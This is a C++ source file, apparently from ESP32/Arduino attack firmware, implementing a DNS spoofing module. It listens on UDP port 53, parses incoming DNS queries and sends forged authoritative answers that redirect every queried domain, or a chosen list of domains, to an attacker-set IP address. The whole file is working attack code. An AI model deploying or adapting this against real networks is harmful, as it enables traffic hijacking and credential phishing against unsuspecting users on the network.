#include "dns_spoof.h"
#include <string.h>

DNSSpoof dnsSpoof;

void DNSSpoof::begin() { _running=false; _domainCount=0; _spoofAll=true; }

bool DNSSpoof::start(IPAddress redirectIP) {
  _redirectIP = redirectIP;
  _spoofed = 0;
  if(!_udp.begin(53)) { Serial.println("DNSSpoof: failed to bind port 53"); return false; }
  _running = true;
  Serial.printf("DNSSpoof: started, redirecting to %s\n", redirectIP.toString().c_str());
  return true;
}

void DNSSpoof::stop() {
  _running = false;
  _udp.stop();
  Serial.printf("DNSSpoof: stopped. spoofed=%d\n", _spoofed);
}

void DNSSpoof::addDomain(const String& domain) {
  if(_domainCount < MAX_SPOOF_DOMAINS)
    _domains[_domainCount++] = domain;
}

bool DNSSpoof::_shouldSpoof(const String& domain) {
  if(_spoofAll) return true;
  for(int i=0;i<_domainCount;i++)
    if(domain.indexOf(_domains[i]) >= 0) return true;
  return false;
}

void DNSSpoof::tick() {
  if(!_running) return;
  int len = _udp.parsePacket();
  if(len <= 0) return;

  uint8_t buf[512];
  len = _udp.read(buf, sizeof(buf));
  if(len < 12) return;

  // Parse DNS query - extract domain name
  String domain = "";
  int pos = 12;
  while(pos < len && buf[pos] != 0) {
    uint8_t labelLen = buf[pos++];
    for(int i=0;i<labelLen&&pos<len;i++)
      domain += (char)buf[pos++];
    if(buf[pos] != 0) domain += '.';
  }

  if(!_shouldSpoof(domain)) return;

  Serial.printf("DNSSpoof: intercepting '%s' -> %s\n",
    domain.c_str(), _redirectIP.toString().c_str());
  _spoofed++;

  // Build DNS response
  uint8_t resp[512];
  memcpy(resp, buf, len);

  // Flags: Response, Authoritative, No error
  resp[2] = 0x81; resp[3] = 0x80;
  // Answer count = 1
  resp[6] = 0x00; resp[7] = 0x01;

  int rpos = len;
  // Pointer to domain name in question
  resp[rpos++] = 0xC0; resp[rpos++] = 0x0C;
  // Type A
  resp[rpos++] = 0x00; resp[rpos++] = 0x01;
  // Class IN
  resp[rpos++] = 0x00; resp[rpos++] = 0x01;
  // TTL = 60s
  resp[rpos++]=0; resp[rpos++]=0; resp[rpos++]=0; resp[rpos++]=60;
  // Data length = 4
  resp[rpos++] = 0x00; resp[rpos++] = 0x04;
  // IP address
  resp[rpos++] = _redirectIP[0];
  resp[rpos++] = _redirectIP[1];
  resp[rpos++] = _redirectIP[2];
  resp[rpos++] = _redirectIP[3];

  _udp.beginPacket(_udp.remoteIP(), _udp.remotePort());
  _udp.write(resp, rpos);
  _udp.endPacket();
}
